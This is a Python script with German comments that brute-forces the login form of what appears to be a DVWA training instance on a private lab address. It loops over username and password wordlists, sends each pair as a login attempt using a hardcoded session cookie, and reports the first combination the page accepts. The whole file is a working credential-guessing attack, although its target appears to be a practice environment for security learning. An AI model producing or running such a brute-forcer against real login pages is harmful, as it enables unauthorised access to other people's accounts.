import requests
import urllib3

# Deaktiviert Warnungen zu unsicheren HTTPS-Verbindungen
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def try_credentials(username, password, brute_url, session_id):
    cookies = {
        'PHPSESSID': session_id,
        'security': 'low'
    }

    params = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'Submit': 'Submit'
    }

    try:
        # Erste Anfrage, um die Session zu setzen
        requests.get(brute_url, cookies=cookies, verify=False)

        # Zweite Anfrage für den Login-Versuch
        response = requests.get(
            brute_url,
            params=params,
            cookies=cookies,
            verify=False
        )

        print(f"\nVersuche {username}:{password}")

        if "Username and/or password incorrect" in response.text:
            print("Falsche Kombination")
            return False, username, password
        elif "Welcome to the password protected area" in response.text:
            print("Richtiges Passwort wurde gefunden")
            return True, username, password
        else:
            print(f"Response Länge: {len(response.text)}")
            print("Response Vorschau:")
            print(response.text[:200])
            return False, username, password

    except Exception as e:
        print(f"Fehler aufgetreten: {str(e)}")
        return False, username, password


def main():
    session_id = "f00de1a0e83a4bba007abf464295fbd5"
    brute_url = "http://10.115.2.22:4280/vulnerabilities/brute/"

    # Benutzernamen- und Passwortlisten einlesen
    with open('username.txt', 'r') as f:
        usernames = [line.strip() for line in f]

    with open('password.txt', 'r') as f:
        passwords = [line.strip() for line in f]

    print(f"Starte Brute-Force-Angriff mit {len(usernames)} Benutzernamen und {len(passwords)} Passwörtern")
    print(f"Verwendete Session-ID: {session_id}")
    print(f"Ziel-URL: {brute_url}")

    # Testverbindung
    try:
        test_response = requests.get(
            brute_url,
            cookies={'PHPSESSID': session_id, 'security': 'low'},
            verify=False
        )
        if test_response.status_code != 200:
            print(f"Verbindungstest fehlgeschlagen mit Statuscode: {test_response.status_code}")
            return
        print("Verbindungstest erfolgreich")

    except Exception as e:
        print(f"Verbindungstest fehlgeschlagen: {str(e)}")
        return

    for username in usernames:
        for password in passwords:
            success, user, pwd = try_credentials(username, password, brute_url, session_id)

            if success:
                print("\nSuper! richtige Kombination wurde gefunden:")
                print(f"Benutzername: {user}")
                print(f"Passwort: {pwd}")
                return

    print("\nKeine gültigen Zugangsdaten gefunden.")


if __name__ == "__main__":
    main()
